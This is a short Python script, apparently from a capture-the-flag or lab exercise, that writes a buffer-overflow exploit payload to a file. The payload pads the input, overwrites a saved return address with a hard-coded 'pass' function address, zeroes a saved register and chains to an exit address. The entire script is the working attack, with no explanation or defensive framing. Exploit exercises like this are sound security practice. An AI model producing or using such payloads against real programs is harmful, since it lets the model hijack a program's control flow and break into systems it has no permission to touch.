from pathlib import Path

PASS_ADDR = 0x104E8
EXIT_ADDR = 0x10E14
RET_OFFSET = 120
SECOND_S0_OFFSET = 240
OUTPUT_PATH = Path(__file__).with_name("payload")

def p64(value):
    return value.to_bytes(8, "little")
payload = (
    b"A" * RET_OFFSET
    + p64(PASS_ADDR)
    + b"B" * (SECOND_S0_OFFSET - RET_OFFSET - 8)
    + p64(0)
    + p64(EXIT_ADDR)
    + b"\n"
)

OUTPUT_PATH.write_bytes(payload)
print(f"Wrote {len(payload)} bytes to {OUTPUT_PATH}")
